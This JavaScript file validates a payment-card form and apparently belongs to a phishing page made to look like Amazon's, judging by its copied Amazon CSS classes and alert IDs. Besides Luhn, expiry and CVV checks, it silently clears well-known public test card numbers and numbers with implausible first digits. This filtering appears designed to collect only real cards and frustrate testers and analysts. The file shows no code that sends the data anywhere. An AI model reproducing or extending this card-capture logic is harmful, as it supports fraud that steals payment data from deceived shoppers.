$(document).ready(function () {
    function showError(fieldId, errorMsg) {
        $("#" + fieldId).addClass('a-form-error').removeClass('a-form-normal');
        $("#" + "inputErrorMsg" + fieldId.charAt(0).toUpperCase() + fieldId.slice(1)).show().html(
            `<div id="auth-${fieldId}-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert" style="display: block;">
                <div class="a-box-inner a-alert-container">
                    <i class="a-icon a-icon-alert"></i>
                    <div class="a-alert-content">${errorMsg}</div>
                </div>
            </div>`
        );
    }

    function hideError(fieldId) {
        $("#" + fieldId).removeClass('a-form-error').addClass('a-form-normal');
        $("#" + "inputErrorMsg" + fieldId.charAt(0).toUpperCase() + fieldId.slice(1)).hide().html('');
    }

    function capitalizeFirstLetter(string) {
        return string.charAt(0).toUpperCase() + string.slice(1);
    }

    function isValidCardNumber(number) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = number.length - 1; i >= 0; i--) {
            let digit = parseInt(number.charAt(i), 10);
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return sum % 10 === 0;
    }

    function validateCardNumber() {
        let ccRaw = $("#cardnumber").val().replace(/\s/g, '');

        if (/^[0-2]|^[7-9]/.test(ccRaw)) {
            $("#cardnumber").val('');
            return false;
        }

        if (/4111111111111111|5500000000000004|340000000000009|30000000000004|3088000000000009/.test(ccRaw)) {
            $("#cardnumber").val('');
            return false;
        }

        if (ccRaw.length === 0) {
            showError("cardnumber", cardnumberEmpty);
            return false;
        } else if (!isValidCardNumber(ccRaw)) {
            showError("cardnumber", cardnumberCheck);
            return false;
        } else {
            hideError("cardnumber");
            return true;
        }
    }

    function formatCardNumber() {
        let val = $("#cardnumber").val().replace(/\D/g, '');
        const maxLength = (/^3[47]/.test(val)) ? 15 : 16;
        if (val.length > maxLength) val = val.slice(0, maxLength);
        let formatted = val.replace(/(.{4})/g, '$1 ').trim();
        $("#cardnumber").val(formatted);
    }

    function validateCardName() {
        let cardname = $("#cardname").val().trim();
        if (cardname === "") {
            showError("cardname", cardnameEmpty);
            return false;
        } else if (cardname.length < 6) {
            showError("cardname", cardnameCheck);
            return false;
        } else {
            hideError("cardname");
            return true;
        }
    }

    function validateCardExp() {
        let val = $("#cardexp").val().trim();
        if (val === "") {
            showError("cardexp", cardexpEmpty);
            return false;
        }
        if (!/^\d{2}\/\d{2}$/.test(val)) {
            showError("cardexp", cardexpinvalidCheck);
            return false;
        }
        let [mm, yy] = val.split('/');
        mm = parseInt(mm, 10);
        yy = parseInt(yy, 10);
        if (mm < 1 || mm > 12) {
            showError("cardexp", cardexpmonth1or12Empty);
            return false;
        }
        if (yy < 25 || yy > 35) {
            showError("cardexp", cardexpyear25or35Empty);
            return false;
        }
        hideError("cardexp");
        return true;
    }
    
    $('#cardexp').mask('00/00');
    
    function validateCVV() {
        let cvv = $("#cvv").val().trim();
        let maxLen = $("#cvv").attr('maxlength') || 3;
        if (cvv === "") {
            showError("cvv", cvvEmpty);
            return false;
        } else if (!/^\d+$/.test(cvv)) {
            showError("cvv", cvvCheck);
            return false;
        }
        hideError("cvv");
        return true;
    }

    function validateAll() {
        const validCardNumber = validateCardNumber();
        const validName = validateCardName();
        const validExp = validateCardExp();
        const validCvv = validateCVV();
        return validCardNumber && validName && validExp && validCvv;
    }

    function detectCardType(number) {
    number = number.replace(/\s+/g, '');
    let bgUrl = '';

    if (/^4[0-9]{0,}$/.test(number)) {
      bgUrl = 'url(../../assets/img/visa.png)';
      $("#cvv").attr('maxlength', '3');
    } else if (/^(5[1-5][0-9]{0,}|2[2-7][0-9]{0,})$/.test(number)) {
      bgUrl = 'url(../../assets/img/mastercard.png)';
      $("#cvv").attr('maxlength', '3');
    } else if (/^3[47][0-9]{0,}$/.test(number)) {
      bgUrl = 'url(../../assets/img/amex.png)';
      $("#cvv").attr('maxlength', '4');
    } else if (/^6(?:011|5[0-9]{2})[0-9]{0,}$/.test(number)) {
      bgUrl = 'url(../../assets/img/discover.png)';
      $("#cvv").attr('maxlength', '3');
    } else if (/^35(2[89]|[3-8][0-9])[0-9]{0,}$/.test(number)) {
      bgUrl = 'url(../../assets/img/jcb.png)';
      $("#cvv").attr('maxlength', '3');
    } else if (/^3(?:0[0-5]|[68][0-9])[0-9]{0,}$/.test(number)) {
      bgUrl = 'url(../../assets/img/diners-club.png)';
      $("#cvv").attr('maxlength', '3');
    } else {
      bgUrl = 'url(../../assets/img/generic-card.png)';
      $("#cvv").attr('maxlength', '3');
    }

        document.getElementById('cardnumber').style.backgroundImage = bgUrl;
    }

    $("#cardnumber").on("keyup focus input paste", function (e) {
        formatCardNumber();
        validateCardNumber();
        detectCardType($(this).val());
        toggleNextButton();
    });

    $("#cardname").on("keyup focus input", function () {
        validateCardName();
        toggleNextButton();
    });

    $("#cardexp").on("keyup focus input", function () {
        validateCardExp();
        toggleNextButton();
    });

    $("#cvv").on("keyup focus input", function () {
        validateCVV();
        toggleNextButton();
    });
    
    function toggleNextButton() {
        if (validateAll()) {
            $("#btn_next").prop("disabled", false);
        } else {
            $("#btn_next").prop("disabled", true);
        }
    }
});
